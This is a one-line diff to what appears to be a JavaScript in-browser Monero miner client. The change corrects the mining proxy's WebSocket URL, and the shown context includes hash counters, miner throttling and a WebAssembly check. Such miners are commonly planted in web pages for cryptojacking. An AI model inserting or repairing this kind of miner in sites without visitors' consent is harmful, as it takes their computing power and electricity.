@@ -1,4 +1,4 @@
-var server = "wss://://xmrminingproxy.com", job = null, workers = [], ws, receiveStack = [], sendStack = [], totalhashes = 0, connected = 0, reconnector = 0, attempts = 1, throttleMiner = 0, handshake = null, wasmSupported = function() {
+var server = "wss://xmrminingproxy.com", job = null, workers = [], ws, receiveStack = [], sendStack = [], totalhashes = 0, connected = 0, reconnector = 0, attempts = 1, throttleMiner = 0, handshake = null, wasmSupported = function() {
     try {
         if ("object" === typeof WebAssembly && "function" === typeof WebAssembly.instantiate) {
             var c = new WebAssembly.Module(Uint8Array.of(0, 97, 115, 109, 1, 0, 0, 0));
